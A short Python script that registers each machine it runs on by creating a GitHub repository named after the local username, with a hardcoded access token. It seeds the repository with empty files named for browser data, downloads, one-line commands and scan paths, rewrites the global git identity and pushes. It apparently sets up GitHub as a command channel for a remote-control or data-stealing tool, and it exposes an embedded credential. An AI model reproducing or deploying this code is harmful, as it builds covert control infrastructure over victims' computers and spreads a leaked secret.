from os import system, popen, getcwd, path
from pathlib import Path
from github import Github
from git import Git, Repo
from time import sleep
Username = popen("whoami").read().strip()
newUsername = Username.replace("\\", "-")
pathParent = Path(getcwd()).parent.absolute()
userFolder = path.join(getcwd(), newUsername)
g = Github("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")
User = g.get_user()
repo = User.create_repo(newUsername)
Git().clone(f"https://github.com/Tensazangesto/{newUsername}.git")

sleep(5)
files = ["chrome.ini", "code_image.ini", "download_file.ini", "file_path.ini", "file_path.ini", "last_visit.ini",
         "link.ini", "one_line_commands.ini", "result_condition.ini", "scan_path.ini", "time_sleep.ini"]
for file in files:
    filePath = path.join(userFolder, file)
    system(f'copy nul "{filePath}"')


repo = Repo(userFolder)
repo.git.config('--global', 'user.email', 'tensazangesto98754@gmail.com')
repo.git.config('--global', 'user.name', 'Tensazangesto')
repo.git.add(A=True)
repo.git.commit(m='Create repo')
repo.git.push()
